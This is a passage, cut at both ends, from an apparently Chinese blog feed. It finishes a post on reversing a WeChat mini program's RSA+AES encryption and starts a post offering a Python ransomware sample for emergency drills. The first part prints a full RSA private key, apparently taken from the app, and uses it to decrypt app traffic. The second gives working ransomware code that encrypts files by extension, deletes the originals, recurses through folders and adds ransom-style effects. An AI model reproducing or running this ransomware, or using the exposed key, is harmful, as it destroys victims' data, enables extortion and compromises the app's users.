class="line">    <span class="number">16</span>)</span><br><span class="line">E = <span class="built_in">int</span>(<span class="string">&quot;10001&quot;</span>, <span class="number">16</span>)</span><br><span class="line">D = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;710bb39aa0c835a7a61dd296bc20bc4c9c427d05954f279a964c744c8b2f3e23a5262c6117074ed98d334edcbc3ba3c538ac25e7ffa946966134380e225b61b25bd38f1d6a2a29edfe2ab59707a6ebdcc31bcb7bf41a853d75a01630098fb3b22387a8fcb1785fd4850c831fa68d7cea93cff945112f0deba069c6716096f651&quot;</span>,</span><br><span class="line">    <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建RSA私钥对象</span></span><br><span class="line">private_key = RSA.construct((N, E, D))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出私钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Private Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key.export_key().decode())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130913885.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Public Key:</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCjjzkGhTTM8xh5F2BKhXKFMz3u</span><br><span class="line">DPAbbib3i+DLVjdj+gsCjQG76Om/blxwfkCnvdI3x/ay6T3hy8j7PoGBEvqB54o2</span><br><span class="line">FPgS5Ny+0gGu+xy3vmyFRr4PhtDXgu5HwCja+WngExVkFxx900sHWpR704ivB+Yq</span><br><span class="line">ZPI8EfMUuy4suSnfCwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Private Key:</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQCe5/K5lPoWuGodAa2CZjsk1Ijy6mrStgJkuttjEZBmdASOcOu6</span><br><span class="line">4iJ0Tri5PVgljrTcMNEdSpQI5K6OttNKThdaEx6qJIQmkEGUfA0eTBZSoJkuqVLV</span><br><span class="line">kO+YNuAUQZfzDvg30t8uoLpTTz8D7Yjo/oMR97YTiyVOmzOVEy208X7g8wIDAQAB</span><br><span class="line">AoGAcQuzmqDINaemHdKWvCC8TJxCfQWVTyealkx0TIsvPiOlJixhFwdO2Y0zTty8</span><br><span class="line">O6PFOKwl5/+pRpZhNDgOIlthslvTjx1qKint/iq1lwem69zDG8t79BqFPXWgFjAJ</span><br><span class="line">j7OyI4eo/LF4X9SFDIMfpo186pPP+UURLw3roGnGcWCW9lECQQDbSn4gpFNbWAqW</span><br><span class="line">JmIqZB3qytyHOGCO3W0MPDUgzhkYXCdU0dewKZv9KCoPCJaqn9Zt6qvH+ijz6zvZ</span><br><span class="line">lAp9yIz5AkEAuYG3VEUUIq/waI1OizsGLUxLXX/QoZ9M04OGqKZnZpivsfy7u5bU</span><br><span class="line">zTd/3h2yWde2YCeGX6fETNEsWf9AUbM0SwJBANMUakGrSx1SqqYK/lTFl9KIQCvc</span><br><span class="line">hX0fADdVwOH54EgFdEp9znqgIqlUvt9HqhdE0Zdt2rocPs1DMZHmoQ6gO6kCQDlt</span><br><span class="line">6BSlohsu/q1Pec5uwnXJlddnV26Bw6YDpO+XPJGtmU7v4CquAklZ8jMQXIOl3Wcd</span><br><span class="line">NWNtq77gTuu5su7YHMsCQGL61drNeJJ48F69q0Qv1+d1ANSNgZB2MuOidUilNOkr</span><br><span class="line">J/b0eAKwUC2a3Rl6okFxTppgzsNYtZ4RpZST/2ftiDs=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>使用RSA公私钥校验工具检测，发现生成的公私钥并不是一对的：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130914699.png" alt="image.png"> </p><p>这也就意味着：加密和解密的密钥不同的两对：</p><p>①客户端-&gt;服务端：客户端加密的时候，使用RSA-1的公钥对随机对称密钥加密</p><p>②服务端：收到客户端密文后，使用RSA-1的私钥进行解密，获取到对称加密密钥，然后解密</p><p>③服务端-&gt;客户端：服务端使用RSA-2的公钥对响应体的密钥进行加密</p><p>④客户端：收到服务端密文，使用RSA-2的私钥进行解密，获取到AES的key，然后再对data进行解密。</p><hr><p>所以，这块要实现在线小程序加解密就只能调试好微信小程序后，将AES密钥固定死，才可以。</p><p>但是，这块反编译后，在微信开发者工具里面小程序跑不起来，寄！</p><h1 id="四-效果验证"><a href="#四-效果验证" class="headerlink" title="四 效果验证"></a>四 效果验证</h1><p>利用模值和指数，生成了一个公钥和私钥。分别为：</p><p>RSA-1的公钥</p><p>RSA-2的私钥</p><p>所以，这块可以使用RSA-2的私钥来验证一下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130914360.png" alt="image.png"> </p><p>RSA解密akey获取到AES密钥</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130915068.png" alt="image.png"> </p><p>AES-ECB解密data获取返回包中明文</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130915418.png" alt="image.png"> </p><h1 id="五-RSA模数和指数原理"><a href="#五-RSA模数和指数原理" class="headerlink" title="五 RSA模数和指数原理"></a>五 RSA模数和指数原理</h1><p>这块详细的介绍和代码均参考了下面这篇文章：</p><p><a href="https://blog.csdn.net/chenhao0568/article/details/136484183">https://blog.csdn.net/chenhao0568/article/details/136484183</a></p><p>一般的工具都是这种的，D、P、Q、DP、DQ、InvQ、N、E，这些参数都是用来生成RSA公钥和私钥需要</p><p>如果只想要知道<a href="https://so.csdn.net/so/search?q=%E5%85%AC%E9%92%A5&spm=1001.2101.3001.7020">公钥</a>和私钥，这就需要<strong>相互转换</strong>。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130916530.png" alt="image.png"> </p><h2 id="RSA-知道公钥模N-公钥指数E-算出公钥"><a href="#RSA-知道公钥模N-公钥指数E-算出公钥" class="headerlink" title="RSA 知道公钥模N 公钥指数E 算出公钥"></a>RSA 知道公钥模N 公钥指数E 算出公钥</h2><p>当知道RSA公钥的模N和公钥指数E时，你可以使用Python中的rsa模块来计算RSA公钥</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入已知的公钥模N和公钥指数E</span></span><br><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the modulus (N): &quot;</span>))</span><br><span class="line">E = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the public exponent (E): &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建RSA公钥对象</span></span><br><span class="line">public_key = RSA.construct((N, E))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出公钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key.export_key().decode())</span><br></pre></td></tr></table></figure><p>上面这块需要注意一下，输入模和指数的时候，要求输入的是10进制数字，如果是非十进制，比如16进制，需要转换一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the modulus (N): &quot;</span>)，<span class="number">16</span>)</span><br><span class="line">E = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the public exponent (E): &quot;</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130917230.png" alt="img"> </p><p>在这个示例中，使用了Crypto模块中的RSA类来构建RSA公钥对象，并将输入的模N和公钥指数E传递给RSA.construct()方法。最后，我们输出了生成的公钥。</p><h2 id="反过来：知道公钥，计算公钥的模-公钥的指数N"><a href="#反过来：知道公钥，计算公钥的模-公钥的指数N" class="headerlink" title="反过来：知道公钥，计算公钥的模 公钥的指数N"></a>反过来：知道公钥，计算公钥的模 公钥的指数N</h2><p>如果已经有了RSA公钥，但不知道公钥模N和公钥指数E，你可以通过以下方式从公钥中提取这些参数。Python的 Crypto 模块提供了这样的功能。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入已知的公钥</span></span><br><span class="line">public_key_pem = <span class="built_in">input</span>(<span class="string">&quot;Enter the public key in PEM format: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从PEM格式的公钥中提取RSA对象</span></span><br><span class="line">public_key = RSA.import_key(public_key_pem)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取公钥模N和公钥指数E</span></span><br><span class="line">N = public_key.n</span><br><span class="line">E = public_key.e</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出公钥模N和公钥指数E</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Modulus (N):&quot;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Exponent (E):&quot;</span>, E)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130917933.png" alt="img"> </p><p>在这个示例中，首先输入了PEM格式的公钥字符串，然后使用 RSA.import_key() 方法将其转换为RSA对象。接着，从RSA对象中提取了模N和公钥指数E，并将它们输出。</p><h2 id="RSA知道私钥参数（P、Q、E、D）算出私钥"><a href="#RSA知道私钥参数（P、Q、E、D）算出私钥" class="headerlink" title="RSA知道私钥参数（P、Q、E、D）算出私钥"></a>RSA知道私钥参数（P、Q、E、D）算出私钥</h2><p>可以使用Python中的rsa模块来构建RSA私钥对象。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入已知的私钥参数</span></span><br><span class="line">P = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the prime factor P: &quot;</span>))</span><br><span class="line">Q = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the prime factor Q: &quot;</span>))</span><br><span class="line">E = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the public exponent (E): &quot;</span>))</span><br><span class="line">D = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the private exponent (D): &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算模N</span></span><br><span class="line">N = P * Q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建RSA私钥对象</span></span><br><span class="line">private_key = RSA.construct((N, E, D, P, Q))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出私钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Private Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key.export_key().decode())</span><br></pre></td></tr></table></figure><p>在这个示例中，首先输入了私钥的参数：两个素数因子P和Q、公钥指数E以及私钥指数D。然后，计算了模N，并使用RSA.construct()方法构建了RSA私钥对象。最后，输出了生成的私钥。</p><ul><li>P 和 Q：这两个质数用于计算模数 N，它们是RSA算法的基础。模数 N 是公钥和私钥的一个重要组成部分，通常非常大（例如，2048位或更大）。</li><li>E：公钥指数，通常是一个较小的整数，且与 (P-1) * (Q-1) 互质。公钥指数用于加密数据。</li><li>D：私钥指数，与公钥指数 E 和模数 N 有关，用于解密数据。私钥指数是一个大整数，它是通过扩展欧几里得算法计算得出的，确保 D * E % ((P-1) * (Q-1)) 等于 1。</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130918922.png" alt="img"> </p><h2 id="知道私钥，算出D-P等所有参数"><a href="#知道私钥，算出D-P等所有参数" class="headerlink" title="知道私钥，算出D,P等所有参数"></a>知道私钥，算出D,P等所有参数</h2><p>如果已经有了RSA私钥，但不知道私钥的所有参数（如P、Q、D等），可以从私钥中提取这些参数。Python的Crypto模块提供了这样的功能。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入已知的私钥</span></span><br><span class="line">private_key_pem = <span class="built_in">input</span>(<span class="string">&quot;Enter the private key in PEM format: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从PEM格式的私钥中提取RSA对象</span></span><br><span class="line">private_key = RSA.import_key(private_key_pem)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取私钥参数</span></span><br><span class="line">N = private_key.n</span><br><span class="line">E = private_key.e</span><br><span class="line">D = private_key.d</span><br><span class="line">P = private_key.p</span><br><span class="line">Q = private_key.q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出私钥参数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Modulus (N):&quot;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Exponent (E):&quot;</span>, E)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Private Exponent (D):&quot;</span>, D)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Prime Factor P:&quot;</span>, P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Prime Factor Q:&quot;</span>, Q)</span><br></pre></td></tr></table></figure><p>在这个示例中，首先输入了PEM格式的私钥字符串，然后使用 RSA.import_key() 方法将其转换为RSA对象。接着，从RSA对象中提取了模N、公钥指数E、私钥指数D以及素数因子P和Q，并将它们输出。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130918845.png" alt="img"> </p><h2 id="生成一对RSA密钥对"><a href="#生成一对RSA密钥对" class="headerlink" title="生成一对RSA密钥对"></a>生成一对RSA密钥对</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成RSA密钥对</span></span><br><span class="line">key = RSA.generate(<span class="number">2048</span>)  <span class="comment"># 生成2048位的RSA密钥对，可以根据需要选择密钥长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出公钥和私钥</span></span><br><span class="line">public_key = key.publickey().export_key()</span><br><span class="line">private_key = key.export_key()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出公钥和私钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key.decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nPrivate Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key.decode())</span><br></pre></td></tr></table></figure><p>在这个示例中，使用了Crypto模块中的RSA.generate()函数来生成一对2048位的RSA密钥对。然后，我们分别导出公钥和私钥，并打印它们。</p><h2 id="RSA生成一对公私钥，要输出格式为16进制"><a href="#RSA生成一对公私钥，要输出格式为16进制" class="headerlink" title="RSA生成一对公私钥，要输出格式为16进制"></a>RSA生成一对公私钥，要输出格式为16进制</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成RSA密钥对</span></span><br><span class="line">key_pair = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取公钥和私钥的16进制字符格式</span></span><br><span class="line">public_key_hex = key_pair.publickey().export_key(<span class="built_in">format</span>=<span class="string">&#x27;DER&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">private_key_hex = key_pair.export_key(<span class="built_in">format</span>=<span class="string">&#x27;DER&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出公钥和私钥的16进制字符格式</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key (Hex):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key_hex)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nPrivate Key (Hex):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(private_key_hex)</span><br></pre></td></tr></table></figure><p>在这个示例中，使用export_key()函数并指定format&#x3D;’DER’参数来获取公钥和私钥的DER编码格式，然后使用.hex()方法将字节串转换为16进制字符格式，并输出它们。</p><h2 id="RSA加密、解密、签名、验签示例"><a href="#RSA加密、解密、签名、验签示例" class="headerlink" title="RSA加密、解密、签名、验签示例"></a>RSA加密、解密、签名、验签示例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> pkcs1_15</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_pair</span>():</span><br><span class="line">    key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message, public_key</span>):</span><br><span class="line">    cipher = PKCS1_OAEP.new(public_key)</span><br><span class="line">    ciphertext = cipher.encrypt(message.encode())</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, private_key</span>):</span><br><span class="line">    cipher = PKCS1_OAEP.new(private_key)</span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">message, private_key</span>):</span><br><span class="line">    hash_obj = SHA256.new(message.encode())</span><br><span class="line">    signature = pkcs1_15.new(private_key).sign(hash_obj)</span><br><span class="line">    <span class="keyword">return</span> signature</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">message, signature, public_key</span>):</span><br><span class="line">    hash_obj = SHA256.new(message.encode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pkcs1_15.new(public_key).verify(hash_obj, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">message = <span class="string">&quot;Hello, world!&quot;</span></span><br><span class="line">key_pair = generate_key_pair()</span><br><span class="line">public_key = key_pair.publickey()</span><br><span class="line">private_key = key_pair</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line">ciphertext = encrypt(message, public_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ciphertext:&quot;</span>, ciphertext.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">plaintext = decrypt(ciphertext, private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Plaintext:&quot;</span>, plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 签名</span></span><br><span class="line">signature = sign(message, private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Signature:&quot;</span>, signature.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证签名</span></span><br><span class="line">is_valid = verify(message, signature, public_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Signature is valid:&quot;</span>, is_valid)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> RSA+AES </tag>
            
            <tag> 数字信封 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急演练勒索样本参考</title>
      <link href="/2024/06/06/%E5%BA%94%E6%80%A5%E6%BC%94%E7%BB%83%E5%8B%92%E7%B4%A2%E6%A0%B7%E6%9C%AC%E5%8F%82%E8%80%83/"/>
      <url>/2024/06/06/%E5%BA%94%E6%80%A5%E6%BC%94%E7%BB%83%E5%8B%92%E7%B4%A2%E6%A0%B7%E6%9C%AC%E5%8F%82%E8%80%83/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一 简介"></a>一 简介</h1><p>勒索病毒（Ransomware）确实是一种常见的网络攻击手段，它会通过加密受害者电脑上的数据来瘫痪受害者的系统，并以此勒索赎金。这种恶意软件的攻击对象可以是个人用户，也可以是企业、政府机构等。一旦数据被加密，除非支付赎金以获取解密密钥，否则这些数据将无法被正常访问。</p><p>随着互联网技术的发展和网络环境的日益复杂，网络安全问题越来越受到重视。不仅公司，包括政府和个人用户都在增强网络安全意识，采取各种措施来预防和应对勒索病毒等网络威胁。应急演练就经常遇到的一种，模拟真实的攻击场景，让团队成员在实际操作中应用应急预案，检验应对能力。</p><h1 id="二-Python实现简易勒索病毒"><a href="#二-Python实现简易勒索病毒" class="headerlink" title="二 Python实现简易勒索病毒"></a>二 Python实现简易勒索病毒</h1><h3 id="生成用于加解密的公私钥"><a href="#生成用于加解密的公私钥" class="headerlink" title="生成用于加解密的公私钥"></a>生成用于加解密的公私钥</h3><p>生成1024位 RSA公私钥 并保存为.pem，先在本地生成，将生成的公钥和加密程序一起打包发送给受害者即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 生产1024位公私钥并保存为.pem  先在本地生成，将生成的公钥和加密程序一起打包发送到受害者即可</span></span><br><span class="line">pub, priv = rsa.newkeys(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">pub = pub.save_pkcs1()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;./keys/pubkey.pem&quot;</span>, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(pub)</span><br><span class="line"></span><br><span class="line">priv = priv.save_pkcs1()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;./keys/privkey.pem&quot;</span>, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(priv)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061740163.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061740434.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061741742.png" alt="image.png"> </p><h3 id="加密文件"><a href="#加密文件" class="headerlink" title="加密文件"></a>加密文件</h3><p>1、定义要加密文件的类型</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061741086.png" alt="image.png"> </p><p>这块加密常见的几种文件类型，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#预定义想要加密的文件后缀名，可以自己选择</span><br><span class="line">target_list_str = &quot;.txt .lnk .pdf .jpg .png .jpeg .doc .docx .xls .xlsx .ppt .pptx .zip .exe&quot;</span><br></pre></td></tr></table></figure><p>2、定义函数，实现加密过程</p><p>传入需要加密的文件名，调用RSA公钥，对文件内容进行加密。</p><p>删除原始文件，并将新生成加密后的文件命名为 .enc 的后缀</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加密过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">filename</span>):</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> filename.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">1</span>] <span class="keyword">in</span> target_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./pubkey.pem&quot;</span>) <span class="keyword">as</span> file:  <span class="comment">#加载RSA公钥，准备加密</span></span><br><span class="line">            pub = file.read()</span><br><span class="line">            pub = rsa.PublicKey.load_pkcs1(pub)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 删除原始文件</span></span><br><span class="line">        os.remove(filename)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">117</span>):</span><br><span class="line">            res.append(rsa.encrypt(data[i:i + <span class="number">117</span>], pub))</span><br><span class="line">        byte_data = <span class="string">b&#x27;&#x27;</span>.join(res)</span><br><span class="line">        byte_data = base64.b64encode(byte_data).decode()</span><br><span class="line"> </span><br><span class="line">        filename = filename + <span class="string">&quot;.enc&quot;</span> <span class="comment">#加密后的文件后缀名改为.enc</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(byte_data)</span><br></pre></td></tr></table></figure><p>3、上面第二步实现的是对单个文件的加密，但一般勒索病毒，要加密实现的是全盘加密。</p><p>这块是应急演练使用，所以，一般是加密某个文件夹下的所有文件。这块就需要列出当前目录下的所有文件，循环使用rsa_encrypt函数实现文件加密</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主要作用就是列出文件夹下所有文件，实现全文件加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                encrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_encrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_encrypt(file_path)</span><br></pre></td></tr></table></figure><p>3、定义主函数main，实现对指定文件夹加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> target_list_str.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        target_list.append(i.strip())</span><br><span class="line"> </span><br><span class="line">     encrypt(<span class="string">&quot;C:\\Users\\analysis\\Desktop\\test&quot;</span>) <span class="comment">#此处自定义想要加密的目录名称</span></span><br></pre></td></tr></table></figure><p>首先创建一个测试文件夹test，里面存放一些常见的文件类型</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061742682.png" alt="image.png"> </p><p>执行脚本后，再次查看该文件夹。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061742689.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061742746.png" alt="image.png"> </p><p>到这儿，就已经实现了勒索病毒最重要的文件加密部分了。</p><h3 id="脚本优化"><a href="#脚本优化" class="headerlink" title="脚本优化"></a>脚本优化</h3><p>这块的优化，主要作用是实现一些其他的功能，让它更像真的勒索病毒。</p><p>下面是几个点优化：</p><ul><li>加密文件名默认为勒索病毒所在文件夹（这块写死是为了后续打包成exe的时候方便）</li><li>生成勒索信</li><li>直接替换受害者桌面壁纸</li><li>调用cmd弹窗，提示受害者”当前主机被勒索了”</li></ul><h4 id="指定文件夹"><a href="#指定文件夹" class="headerlink" title="指定文件夹"></a>指定文件夹</h4><p>直接调用os，python获取当前文件夹即可：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前工作目录</span></span><br><span class="line">current_directory = os.getcwd()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前工作目录是：&quot;</span>, current_directory)</span><br></pre></td></tr></table></figure><p>所以，原代码可以修改为：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061744823.png" alt="image.png"> </p><p>测试一下效果：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061744836.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061744450.png" alt="image.png"> </p><h4 id="调用Windows弹窗"><a href="#调用Windows弹窗" class="headerlink" title="调用Windows弹窗"></a>调用Windows弹窗</h4><p>可以使用tkinter模块来实现一个简单的Windows弹窗</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061747628.png" alt="image.png"> </p><p>所以，可以修改原脚本代码为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 